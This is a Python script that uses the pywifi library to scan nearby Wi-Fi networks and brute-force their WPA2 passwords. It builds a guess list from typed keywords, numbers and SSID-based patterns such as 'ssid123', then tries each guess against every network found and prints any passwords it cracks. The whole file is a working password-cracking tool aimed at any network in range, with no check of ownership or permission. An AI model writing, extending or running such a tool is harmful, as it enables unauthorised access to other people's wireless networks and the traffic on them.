import time
import pywifi
from pywifi import const
import os
import logging

# Suppress pywifi's log messages
logging.getLogger("pywifi").setLevel(logging.CRITICAL)

# Initialize variables
password_file = "password_list.txt"
available_devices = []
keys = set()  # Using set to prevent duplicates
final_output = {}

# Get Wi-Fi interface information
try:
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    print(f"Wi-Fi Interface Name: {interface.name()}")
except IndexError:
    print("No Wi-Fi interface found. Exiting.")
    exit()

# Scan for available networks
def scan_networks():
    print("Scanning for available networks...")
    interface.scan()
    time.sleep(5)  # Wait for scan results
    return list(set(network.ssid for network in interface.scan_results()))  # Remove duplicates

available_devices = scan_networks()
print("\nAvailable Networks:")
for network in available_devices:
    print(f" - {network}")

# Load existing passwords from the file
def load_passwords(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return {line.strip() for line in f}
    return set()

keys = load_passwords(password_file)

# Generate new passwords
def generate_passwords(ssid_list, existing_keys):
    new_passwords = set()
    for ssid in ssid_list:
        print(f"\nFor network '{ssid}':")

        keywords = input("Enter possible keywords (comma-separated): ").split(",")
        keywords = [kw.strip() for kw in keywords if kw.strip()]

        numbers = input("Enter possible numbers (comma-separated): ").split(",")
        numbers = [num.strip() for num in numbers if num.strip()]

        # Combine keywords and numbers to form password patterns
        for keyword in keywords:
            for number in numbers:
                new_passwords.update({
                    keyword,
                    f"{keyword}{number}",
                    f"{number}{keyword}"
                })

        # Add common patterns
        new_passwords.update({
            f"{ssid}123",
            f"123{ssid}",
            f"{ssid.lower()}2024"
        })

    return new_passwords - existing_keys

new_passwords = generate_passwords(available_devices, keys)

# Save new passwords to the file
def save_passwords(file, passwords):
    with open(file, "a") as f:
        for password in passwords:
            f.write(password + "\n")

if new_passwords:
    save_passwords(password_file, new_passwords)
    print("\nNew passwords added to 'password_list.txt'.")
else:
    print("\nNo new passwords to add; all are already in the file.")

# Reload keys after adding new passwords
keys.update(new_passwords)

# Attempt to connect to networks
def try_crack_wifi(networks, keys):
    results = {}
    for network in networks:
        profile = pywifi.Profile()
        profile.ssid = network.strip()
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        for key in keys:
            print(f"Trying password '{key}' for network '{network}'...")
            profile.key = key.strip()
            try:
                interface.remove_all_network_profiles()
                interface.add_network_profile(profile)
                interface.connect(profile)
                time.sleep(4)

                if interface.status() == const.IFACE_CONNECTED:
                    print(f"Password found! Wi-Fi network '{network}' has the password: {key}")
                    results[network] = key
                    interface.disconnect()
                    break
            except Exception as e:
                print(f"Error while trying password '{key}' for network '{network}': {e}")

    return results

final_output = try_crack_wifi(available_devices, keys)

# Display discovered passwords
print("\n" + "*" * 10 + " Discovered Passwords " + "*" * 10)
print(f"{'WIFI NETWORK':<20}{'PASSWORD':<}")
for ssid, password in final_output.items():
    print(f"{ssid:<20}{password:<}")
